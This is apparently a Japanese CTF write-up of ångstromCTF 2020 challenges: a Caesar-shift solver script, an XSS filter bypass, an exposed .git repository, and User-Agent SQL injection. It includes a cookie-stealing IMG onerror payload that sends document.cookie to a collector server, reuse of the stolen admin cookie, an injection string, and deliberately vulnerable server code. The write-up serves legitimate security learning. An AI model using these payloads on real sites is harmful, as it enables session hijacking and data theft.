+            <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0123456789</span><span style="color:#e6db74">&#39;</span>:
+                <span style="color:#66d9ef">if</span> encode(a, s) <span style="color:#f92672">==</span> b:
+                    buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> s
+                    <span style="color:#66d9ef">if</span> len(buf) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+                        buf <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">1</span>:]
+
+                    <span style="color:#66d9ef">if</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">!</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> int(buf) <span style="color:#f92672">&lt;</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+                        flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(int(buf))
+                        buf <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+                    <span style="color:#66d9ef">elif</span> int(buf) <span style="color:#f92672">==</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+                        flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(int(buf))
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>綺麗にフラグが復元されるはずでしたが、関係ない文字列が大量にでてきてしまいました。</p>
+<p>フラグフォーマットである<code>actf</code>で検索すると、フラグが見つかりました！！</p>
+<p><code>actf{inhale_exhale_ezpz-12309biggyhaby}</code></p>
+<h2 id="shifter-misc-160-pts-454-solves">Shifter (Misc, 160 pts, 454 solves)</h2>
+<pre><code>What a strange challenge...
+
+It'll be no problem for you, of course!
+
+nc misc.2020.chall.actf.co 20300
+</code></pre><p><code>nc</code>コマンドを使ってみましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\kuzushiki\Desktop&gt; nc misc.2020.chall.actf.co 20300                       Solve 50 of these epic problems <span style="color:#66d9ef">in</span> a row to prove you are a master crypto man like Aplet123!
+You<span style="color:#960050;background-color:#1e0010">&#39;</span>ll be given a number n and also a plaintext p.
+Caesar shift `p` with the nth Fibonacci number.
+n &lt; 50, p is completely uppercase and alphabetic, len(p) &lt; 50
+You have 60 seconds!
+--------------------
+Shift UUQWIZSFTWAAMYFCB by n=38
+</code></pre></div><p>与えられた文字列をシフトして返してあげれば良さそうです。</p>
+<p>フィボナッチ数列でp番目の値の分だけシフトする必要があります。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shift_p</span>(enc, p):
+    dec <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> enc:
+        dec <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr((ord(c) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> p) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>))
+    <span style="color:#66d9ef">return</span> dec
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fib</span>(n):
+    a, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">return</span> a
+    <span style="color:#66d9ef">elif</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+        <span style="color:#66d9ef">return</span> b
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>):
+            a, b <span style="color:#f92672">=</span> b, a <span style="color:#f92672">+</span> b
+        <span style="color:#66d9ef">return</span> b
+
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20300</span>)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">--------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
+    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-8</span><span style="color:#e6db74">&#39;</span>)
+    enc <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>]
+    shift <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">=</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>]
+    <span style="color:#66d9ef">print</span>(enc, shift)
+    dec <span style="color:#f92672">=</span> shift_p(enc, fib(int(shift, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+    <span style="color:#66d9ef">print</span>(dec)
+    io<span style="color:#f92672">.</span>sendline(dec<span style="color:#f92672">.</span>encode())
+<span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recv())
+</code></pre></div><p>結果は以下の通り。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">OBBQQWTOJD <span style="color:#ae81ff">9</span>
+WJJYYEBWRL
+:
+:
+長いので省略
+:
+:
+CQFESMMOXICXCZTYYUYJHFXKCRBJIPGXAHNIXIQRMOGWXGHR <span style="color:#ae81ff">33</span>
+UIXWKEEGPAUPURLQQMQBZXPCUJTBAHYPSZFAPAIJEGYOPYZJ
+AIRDSGYTAKLPNZBTMEL <span style="color:#ae81ff">23</span>
+FNWIXLDYFPQUSEGYRJQ
+OPUTOYPULZQQSXXNCXEWZHNEQEXOXOOQYJGBYRY <span style="color:#ae81ff">38</span>
+RSXWRBSXOCTTVAAQFAHZCKQHTHARARRTBMJEBUB
+GPUUHSOYMPNFXGTGKKWBFAPZJWMYIIDPYAZHBIXIU <span style="color:#ae81ff">33</span>
+YHMMZKGQEHFXPYLYCCOTXSHRBOEQAAVHQSRZTAPAM
+b<span style="color:#e6db74">&#39;actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}\n&#39;</span>
+</code></pre></div><p>フラグが得られました！！</p>
+<p><code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
+<h1 id="web">WEB</h1>
+<h2 id="the-magic-word-web-20-pts-1304-solves">The Magic Word (Web, 20 pts, 1304 solves)</h2>
+<pre><code>Ask and you shall receive...that is as long as you use the magic word.
+</code></pre><p><a href="https://magicword.2020.chall.actf.co/">問題ページ</a>にアクセスすると、<code>give flag</code>という文字が。</p>
+<p>ソースのscript部分を見てみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;magic&#34;</span>);
+            <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>() {
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">magic</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;please give flag&#34;</span>) {
+                    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/flag?msg=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">innerText</span>))
+                        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">res</span> =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>())
+                        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">txt</span> =&gt; <span style="color:#a6e22e">magic</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">txt</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">`</span><span style="color:#e6db74">`</span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">v</span> =&gt; String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xf</span>)).<span style="color:#a6e22e">join</span><span style="color:#e6db74">`</span><span style="color:#e6db74">`</span>);
+                }
+            }, <span style="color:#ae81ff">1000</span>);
+        <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
+</code></pre></div><p>どうやら<code>give flag</code>を<code>please give flag</code>にすれば良さそうです。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066944-75274c80-6a27-11ea-87b0-216fcba325f2.gif" alt="magic"></p>
+<p>フラグがでてきました！！</p>
+<p><code>actf{1nsp3c7_3l3m3nt_is_y0ur_b3st_fri3nd}</code></p>
+<h2 id="xmas-still-stands-web-50-pts-459-solves">Xmas Still Stands (Web, 50 pts, 459 solves)</h2>
+<pre><code>You remember when I said I dropped clam's tables? Well that was on Xmas day.
+And because I ruined his Xmas, he created the Anti Xmas Warriors to try to ruin everybody's Xmas.
+Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?
+</code></pre><p><a href="https://xmas.2020.chall.actf.co/">問題ページ</a>では、記事の投稿と報告ができるようです。</p>
+<p>また、管理者ページもありますが、クッキー情報による認証をしており、弾かれてしまします。</p>
+<p>管理者のクッキーを手に入れましょう。</p>
+<p>問題名からして<code>XSS</code>の脆弱性がありそうです。</p>
+<p>以下のような記事を投稿しました。
+<code>&lt;s&gt;test&lt;/s&gt;</code></p>
+<p>記事へのリンクが出てくるので確認してみると、
+ちゃんと<code>&lt;s&gt;</code>タグが認識されていました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067087-bae41500-6a27-11ea-8592-ca217a04e737.PNG" alt="キャプチャxss"></p>
+<p>もし<code>&lt;script&gt;</code>タグが認識されればスクリプトを実行することができます。</p>
+<p>しかし、以下のスクリプトは実行されませんでした。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>おそらく<code>&lt;script&gt;</code>タグを弾いているのでしょう。</p>
+<p>XSSフィルター回避手法の１つとして、<code>&lt;IMG&gt;</code>タグを使う方法があります。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">/</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">img</span>&gt;
+</code></pre></div><p>試してみると、ちゃんと実行されました！</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067136-d0593f00-6a27-11ea-8c70-ffb8bdf50084.PNG" alt="キャプチャxss2"></p>
+<p>それではクッキー情報を特定のサーバに送るスクリプトを投稿してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">IMG</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">/</span>  <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;document.location=&#39;[ここは好きなように]?c=&#39;+document.cookie&#34;</span>&gt;&lt;/<span style="color:#f92672">img</span>&gt;
+</code></pre></div><p>自分でサーバを立てても良いですが、<a href="https://requestbin.com/">Requestbin</a>というサイトを使うと簡単にアドレスが得られ、そこに飛んでくるリクエストを記録することができるのでオススメです。</p>
+<p>今回欲しいのは管理者のクッキー情報なので、投稿内容を<code>report</code>ページで管理者に報告します。</p>
+<p>すると以下のようなリクエストが送られてきました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77067578-83c23380-6a28-11ea-9417-fe3dc837020d.png" alt="FireShot Capture 026 - RequestBin com — A modern request bin to collect, inspect and debug H_ - requestbin com"></p>
+<p>このクッキー情報を<code>admin</code>ページでの認証に使ってみましょう！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# curl -i -b <span style="color:#e6db74">&#39;super_secret_admin_cookie=hello_yes_i_am_admin; admin_name=Jeff&#39;</span> https://xmas.2020.chall.actf.co/admin
+
+（途中は省略）
+
+&lt;p&gt;Hey admins, you may have noticed that we<span style="color:#e6db74">&#39;ve changed things up a bit. There&#39;</span>s no longer any cumbersome, bruteforceable login system. All you need is the secret cookie verifying that you<span style="color:#e6db74">&#39;re an admin and you can get the flag anytime you want. Also, if you&#39;</span>re not an admin PLEASE LEAVE THIS PAGE YOU DON<span style="color:#e6db74">&#39;T BELONG HERE AND I WILL HUNT YOU DOWN AND RUIN YOUR DAY IF YOU STAY HERE. Disclaimer: I will not actually hunt you down or physically hurt you in any way, shape, or form, please don&#39;</span>t sue me thanks.&lt;/p&gt;
+        &lt;p&gt;Oh hey admin! The flag is actf<span style="color:#f92672">{</span>s4n1tize_y0ur_html_4nd_y0ur_h4nds<span style="color:#f92672">}</span>.&lt;/p&gt;
+</code></pre></div><p>フラグが得られました！！！</p>
+<p><code>actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}</code></p>
+<h2 id="git-good-web-70-pts-536-solves">Git Good (Web, 70 pts, 536 solves)</h2>
+<pre><code>Did you know that angstrom has a git repo for all the challenges? 
+I noticed that clam committed a very work in progress challenge so I thought it was worth sharing.
+</code></pre><p><a href="https://gitgood.2020.chall.actf.co/">問題ページ</a>にアクセスしても特に手掛かりは無さそうです。</p>
+<p>問題名からしてgitに関係あるのでしょう</p>
+<p>/.gitにアクセスできるか試してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# curl https://gitgood.2020.chall.actf.co/.git/logs/HEAD
+<span style="color:#ae81ff">0000000000000000000000000000000000000000</span> 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5 aplet123 &lt;jasonqan2004@gmail.com&gt; <span style="color:#ae81ff">1583598444</span> +0000	commit <span style="color:#f92672">(</span>initial<span style="color:#f92672">)</span>: haha I lied this is the actual initial commit
+6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5 e975d678f209da09fff763cd297a6ed8dd77bb35 aplet123 &lt;jasonqan2004@gmail.com&gt; <span style="color:#ae81ff">1583598464</span> +0000	commit: Initial commit
+</code></pre></div><p>アクセスできました！！</p>
+<p>というわけで<code>git clone</code>をしましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# git clone https://gitgood.2020.chall.actf.co/.git/
+Cloning into <span style="color:#e6db74">&#39;gitgood.2020.chall.actf.co&#39;</span>...
+</code></pre></div><p>中を見ると<code>thisistheflag.txt</code>というファイルがありますが、変更されてしまっています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/gitgood.2020.chall.actf.co# ls
+index.html  package.json       thisistheflag.txt
+index.js    package-lock.json
+root@kali:/media/sf_share/CTF/angstrom/gitgood.2020.chall.actf.co# cat thisistheflag.txt 
+There used to be a flag here...
+</code></pre></div><p>本当の<code>initial commit</code>の変更履歴を見てみましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/gitgood.2020.chall.actf.co# git diff -p 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
+diff --git a/thisistheflag.txt b/thisistheflag.txt
+index 0f52598..247c9d4 <span style="color:#ae81ff">100644</span>
+--- a/thisistheflag.txt
++++ b/thisistheflag.txt
+@@ -1,3 +1 @@
+-actf<span style="color:#f92672">{</span>b3_car3ful_wh4t_y0u_s3rve_wi7h<span style="color:#f92672">}</span>
+-
+-btw this isn<span style="color:#960050;background-color:#1e0010">&#39;</span>t the actual git server
++There used to be a flag here...
+</code></pre></div><p>フラグが出てきました！！</p>
+<p><code>actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}</code></p>
+<h2 id="secret-agents-web-110-pts-520-solves">Secret Agents (Web, 110 pts, 520 solves)</h2>
+<pre><code>Can you enter the secret agent portal? I've heard someone has a flag :eyes:
+
+Our insider leaked the source, but was &quot;terminated&quot; shortly thereafter...
+</code></pre><p>まず<a href="https://agents.2020.chall.actf.co">問題ページ</a>のソースを見てみましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+
+&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;
+	&lt;<span style="color:#f92672">title</span>&gt;Super Secret Agents Portal&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;padding: 50px&#34;</span>&gt;
+	&lt;<span style="color:#f92672">h1</span>&gt;Welcome to the Super Secret Agents official site!&lt;/<span style="color:#f92672">h1</span>&gt;&lt;<span style="color:#f92672">br</span> /&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+	&lt;<span style="color:#f92672">p</span>&gt;Only super secret agents will be able to enter... will  you?&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+	&lt;<span style="color:#f92672">p</span>&gt;Unfortunately for the not-so-super-secret agents, our advanced AI neural network blockchain big data Python3.5 Docker DigitalOcean military-grade encryption cybersecurity algorithm will keep them out without needing a login system!&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+	
+	&lt;<span style="color:#f92672">p</span>&gt;Here&#39;s the secret: actual secret agents have their OWN BROWSERS!!!!! NOT POSERS&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+	&lt;<span style="color:#f92672">p</span>&gt;Will it let you in? Enter!&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">br</span> /&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+	&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span>&gt;
+		&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lemme get in&#34;</span>&gt;
+	&lt;/<span style="color:#f92672">form</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>どうやら正しいユーザエージェント（以下UA）を設定して<code>/login</code>にアクセスすれば良さそうです。</p>
+<p>サーバサイドのプログラムについてもソースがあるので読んでみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, request
+<span style="color:#75715e">#from flask_limiter import Limiter</span>
+<span style="color:#75715e">#from flask_limiter.util import get_remote_address</span>
+
+<span style="color:#f92672">from</span> .secret <span style="color:#f92672">import</span> host, user, passwd, dbname
+
+<span style="color:#f92672">import</span> mysql.connector
+
+
+dbconfig <span style="color:#f92672">=</span> {
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">host</span><span style="color:#e6db74">&#34;</span>:host,
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#34;</span>:user,
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">passwd</span><span style="color:#e6db74">&#34;</span>:passwd,
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">database</span><span style="color:#e6db74">&#34;</span>:dbname
+}
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">limiter = Limiter(</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	app,</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	key_func=get_remote_address,</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	default_limits=[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1 per second</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">],</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+
+<span style="color:#75715e">#@limiter.exempt</span>
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index.html</span><span style="color:#e6db74">&#34;</span>)
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/login</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+	u <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">User-Agent</span><span style="color:#e6db74">&#34;</span>)
+
+	conn <span style="color:#f92672">=</span> mysql<span style="color:#f92672">.</span>connector<span style="color:#f92672">.</span>connect(
+					<span style="color:#f92672">*</span><span style="color:#f92672">*</span>dbconfig
+					)
+
+	cursor <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+
+	<span style="color:#75715e">#cursor.execute(&#34;SET GLOBAL connect_timeout=1&#34;)</span>
+	<span style="color:#75715e">#cursor.execute(&#34;SET GLOVAL wait_timeout=1&#34;)	</span>
+	<span style="color:#75715e">#cursor.execute(&#34;SET GLOBAL interactive_timeout=1&#34;)</span>
+
+	<span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SELECT * FROM Agents WHERE UA=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(u), multi<span style="color:#f92672">=</span>True):
+		<span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>with_rows:
+			res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>fetchall()
+			<span style="color:#66d9ef">break</span>
+
+	cursor<span style="color:#f92672">.</span>close()
+	conn<span style="color:#f92672">.</span>close()
+
+	
+
+	<span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">login.html</span><span style="color:#e6db74">&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">stop! you</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">re not allowed in here &gt;:)</span><span style="color:#e6db74">&#34;</span>)
+
+	<span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">login.html</span><span style="color:#e6db74">&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">hey! close, but no bananananananananana!!!! (there are many secret agents of course)</span><span style="color:#e6db74">&#34;</span>)
+
+
+	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">login.html</span><span style="color:#e6db74">&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Welcome, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(res[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]))
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+	app<span style="color:#f92672">.</span>run(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0.0.0.0</span><span style="color:#e6db74">&#39;</span>)
+</code></pre></div><p>以下の部分にSQLインジェクションの脆弱性がありそうです</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SELECT * FROM Agents WHERE UA=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(u), multi<span style="color:#f92672">=</span>True):
+	<span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>with_rows:
+		res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>fetchall()
+		<span style="color:#66d9ef">break</span>
+</code></pre></div><p>試しに<code>' or 1=1--'</code>をUAに設定して<code>/login</code>にアクセスしてみましょう</p>
+<p>上手くいけば<code>%s</code>の部分が置き換わるので、</p>
+<p><code>SELECT * FROM Agents WHERE UA='' or 1=1--''</code></p>
+<p>となって、という命令になるのでDBから全てのUAを抽出できます。</p>
